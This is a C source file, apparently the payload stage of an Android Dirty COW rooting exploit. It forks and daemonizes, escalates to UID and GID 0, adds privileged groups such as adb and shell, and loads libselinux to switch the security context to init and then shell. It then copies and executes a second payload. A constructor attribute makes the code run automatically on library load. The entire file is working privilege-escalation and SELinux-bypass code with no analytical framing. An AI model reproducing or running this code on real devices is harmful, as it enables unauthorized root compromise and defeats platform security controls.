//
// Created by k.leyfer on 15.03.2017.
//

#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdbool.h>
#include <bits/timespec.h>
#include "dirty/common/logging.h"
#include "utils/payload_utils.h"
#include "dirty/file_utils/file_utils.h"

typedef int getcon_t(char** con);

typedef int setcon_t(const char* con);

int payload_main()
{
  LOGV("%d: hi (%d)", getpid(), getuid());

  int orig_pid = getpid();
  pid_t pid = fork();
  if (pid == 0)
  {
    daemon(0, 0);

    if (getuid() != 0)
    {
      if (setresgid(0, 0, 0))
      {
        LOGV("setresgid failed: %s", strerror(errno));
        exit(0);
      }

      if (setresuid(0, 0, 0))
      {
        LOGV("setresuid failed: %s", strerror(errno));
        exit(0);
      }
    }

    gid_t groups[] = {
        1004,  // input
        2000,  // shell
        1007,  // log
        1011,  // adb
        1015,  // sdcard_rw
        1028,  // sdcard_r
    };

    if (setgroups(sizeof(groups) / sizeof(groups[0]), groups) != 0)
    {
      LOGV("Unable to set groups: %s", strerror(errno));
      exit(0);
    }
    else
    {
      LOGV("set groups OK!");
    }

    dlerror();
#ifdef __aarch64__
    void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
    void* selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
    if (selinux)
    {
      void* getcon = dlsym(selinux, "getcon");
      const char* error = dlerror();
      if (!error)
      {
        getcon_t* getcon_p = (getcon_t*) getcon;
        char* secontext;
        int ret = (*getcon_p)(&secontext);

        void* setcon = dlsym(selinux, "setcon");
        const char* error = dlerror();
        if (!error)
        {
          setcon_t* setcon_p = (setcon_t*) setcon;

          if ((*setcon_p)("u:r:init:s0") != 0)
          {
            LOGV("Unable to set context: %s!", strerror(errno));
          }

          if ((*setcon_p)("u:r:shell:s0") != 0)
          {
            LOGV("Unable to set context: %s!", strerror(errno));
          }

          (*getcon_p)(&secontext);
          LOGV("Current context: %s", secontext);
        }
      }
      dlclose(selinux);
    }
    else
    {
      LOGV("SELinux not found.");
    }

    if (getuid() == 0)
    {
      LOGV("root!");
    }

    if (copy_payload() == -1)
    {
      LOGV("Unable to copy payload!");
      exit(1);
    }

    if (execle(EXEC_PAYLOAD_DST_PATH, EXEC_PAYLOAD_DST_PATH, (char*) NULL, environ) == -1)
    {
      LOGV("Unable to exec payload: %s!", strerror(errno));
      exit(1);
    }

    exit(0);
  }
  else if (pid != -1)
  {
    // keep main process busy to avoid restart payload by init.
    while (1)
    {
      sleep(1);
    }
  }
  else
  {
    // unable to fork, exit so init can restart our payload.
    exit(1);
  }
}

int main(int argc, char const* argv[])
{
  return payload_main();
}

__attribute__((constructor)) void say_hello()
{
  payload_main();
}
